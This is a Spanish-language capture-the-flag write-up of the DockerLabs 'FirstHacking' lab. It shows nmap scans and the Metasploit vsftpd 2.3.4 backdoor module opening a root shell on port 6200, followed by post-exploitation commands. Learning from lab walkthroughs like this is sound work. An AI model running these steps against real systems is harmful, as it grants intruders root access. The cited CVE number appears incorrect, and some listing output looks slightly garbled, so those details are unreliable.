# DockerLabs - FirstHacking

## Resumen
- **Dificultad:** Very Easy
- **Técnicas:** Enumeración de puertos, vsftpd 2.3.4 backdoor exploit
- **Tiempo:** ~5 minutos
- **Fecha:** 2026-04-15

## Info
| | |
|---|---|
| IP | 172.17.0.2 |
| OS | Linux (Docker) |
| Servicios | 21/tcp (FTP) |

---

## Reconocimiento

### Escaneo de puertos

```bash
sudo nmap -sS -p- -vvv --open --min-rate 5000 -n -Pn 172.17.0.2 -oG nmap/allPorts
```

Resultado:
- **21/tcp** abierto — FTP service

### Version detection

```bash
nmap -sVC -p 21 172.17.0.2
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 2.3.4 |

¡Una versión histórica! vsftpd 2.3.4 fue comprometido en 2011 con una backdoor insertada en el código fuente oficial.

---

## Explotación

### Análisis del servicio

vsftpd 2.3.4 es conocido por tener una backdoor que:
- Se activa enviando un usuario con paréntesis de cierre `)`
- Abre una shell en el puerto **6200/tcp**
- Permite ejecución remota de comandos como root

### Busqueda de exploits

```bash
msfconsole -q
search vsftpd 2.3.4
```

**Resultado:**
```
0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  No  VSFTPD v2.3.4 Backdoor Command Execution
```

### Explotación con Metasploit

```bash
use 0
set RHOSTS 172.17.0.2
set RPORT 21
run
```

**Output:**

```
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.17.0.1:41149 -> 172.17.0.2:6200) at 2026-04-15 22:54:04 -0300
```

**¡Acceso root inmediato!**

El backdoor nos da shell directo como root en el puerto 6200 sin necesidad de escalar privilegios.

---

## Post-explotación

### Verificación de acceso

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

pwd
# /root
```

### Exploración del sistema

```bash
ls -la /root
# total 32
# drwx------  1 root root 4096 Apr 12 11:34 .
# drwxr-xr-x   1 root root 4096 Apr 15 22:54 root
# -rw-r--r--  1 root root   125 Mar 17  2024 .bashrc
# -rw-r--r--  1 root root   655 Feb  5  2024 .profile
```

---

## Flags

No se encontró flag en esta máquina — el objetivo es obtener acceso root.

---

## Lecciones aprendidas

1. **vsftpd 2.3.4 backdoor**: Una de las vulnerabilidades más clásicas de la historia — el exploit de Metasploit funciona directamente
2. **Versiones obsoletas = peligro**: Siempre verificar versiones de servicios con `nmap -sV`
3. **Puertos poco comunes**: Si ves el puerto 6200 abierto, es casi seguro que es la backdoor de vsftpd
4. **Contraseñas por defecto / código comprometido**: No siempre es necesario fuerza bruta — a veces el software mismo está comprometido

---

## Comandos útiles

```bash
# Reconocimiento
nmap -sS -p- -vvv --open --min-rate 5000 -n -Pn 172.17.0.2
nmap -sVC -p 21 172.17.0.2

# Explotación
msfconsole -q
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
run

# Post-explotación
whoami
id
ls -la /root
```

---

## Referencias

- [vsftpd 2.3.4 Backdoor - Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [CVE-2011-2522](https://nvd.nist.gov/vuln/detail/CVE-2011-2522)